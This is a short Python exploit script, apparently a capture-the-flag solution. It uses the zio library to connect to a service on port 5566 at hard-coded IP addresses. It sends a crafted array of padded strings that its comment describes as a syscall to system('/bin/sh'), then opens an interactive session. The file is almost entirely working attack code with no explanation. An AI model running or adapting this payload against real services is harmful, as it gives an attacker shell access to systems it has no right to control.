#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *

ip = '210.61.2.51'
ip = '10.211.55.48'
port = 5566

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))

# syscall system(/bin/sh)
ary = ['AAAAAAAAAAA#:7[F', "AAAAAAAAAAA%J'ic", "AAAAAAAAAAA#L;4t", "AAAAAAAAAAA!x&J`", "AAAAAAAAAAA!d?O9", 'AAAAAAAAAAA#L;4t']
ary+= ['AAAAAAAAAAA*A$D;', 'AAAAAAAAAAA$fF6)', "AAAAAAAAAAA#L;4t", "AAAAAAAAAAA!x&J`", "AAAAAAAAAAA$b(%T", 'AAAAAAAAAAA#L;4t']
ary+= ['AAAAAAAAAAA)r,BN', 'AAAAAAAAAAA!P|p;', 'AAAAAAAAAAA+dajd', 'AAAAAAAAAAA!"1lz', 'AAAAAAAAAAA!D(*5']
io.write(l32(len(ary)))
for i in ary:
    io.write(i)

io.interact()
